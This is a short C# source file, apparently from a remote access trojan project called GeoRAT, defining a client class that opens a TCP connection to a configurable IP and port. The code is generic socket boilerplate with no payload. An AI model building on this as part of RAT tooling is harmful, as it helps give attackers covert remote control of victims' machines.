using System;
using System.Net.Sockets;


namespace GeoRAT.Client.Network
{
    class ClientNetwork
    {
        //fields and properties

        public string Ip { get; private set; } 
        public int Port { get; private set; }
        private Socket ClientSocket;

        //delegates and events 
        public delegate void Connected(Socket s);

        public event Connected OnConnected;
        ////

            //constructor 

        public ClientNetwork(string Ip, int Port)
        {
            this.Ip = Ip;
            this.Port = Port;
            ClientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        }

        public void BeginConnect()
        {
            
                ClientSocket.BeginConnect(Ip, Port, ConnectedCallback, null);      
            
        }

        private void ConnectedCallback(IAsyncResult result)
        {
            try
            {
                ClientSocket.EndConnect(result);
                OnConnected?.Invoke(ClientSocket);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);

            }
        }

    }
  }

